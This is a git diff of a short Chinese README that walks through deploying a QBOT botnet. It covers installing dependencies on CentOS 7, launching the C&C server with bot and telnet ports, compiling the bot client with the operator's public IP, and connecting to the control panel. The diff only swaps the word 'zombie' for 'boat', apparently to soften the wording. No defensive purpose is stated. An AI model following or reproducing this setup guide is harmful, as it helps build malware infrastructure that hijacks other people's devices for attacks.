@@ -1,4 +1,4 @@
-# 非常哈基米的僵尸网络(QBOT)  
+# 非常哈基米的僵尸网络(QBAOT)  
 `首先你得有一个centos 7系统`  
 然后安装依赖  
 ```bash
@@ -22,7 +22,7 @@ vi login.txt
 #格式:
 用户名 密码
 #然后启动主端
-screen ./server 监听僵尸端口 线程 telnet连接端口
+screen ./server 监听船端口 线程 telnet连接端口
 ctrl+a+d退出
 如果你想查看主端可以先输入指令
 screen -ls
@@ -38,11 +38,11 @@ client.c:
 unsigned char *commServer[] = {"ip:port", "ip:port"};
 
 ```
-## 编译僵尸
+## 编译船
 ```python
 #忘了这个哈哈
 
-python bot_install.py client.c 你的公网IP
+python boat_install.py client.c 你的公网IP
 ```
 ## 连接cnc端
 ```
@@ -55,4 +55,4 @@ telnet 你的服务器的公网ip 你设置的连接端口
 ## 教程结束，完结撒花
 `完事就是这么简单`  
 `传马命令他会给出的`  
-`后面僵尸自己弄`  
+`后面船自己弄`  
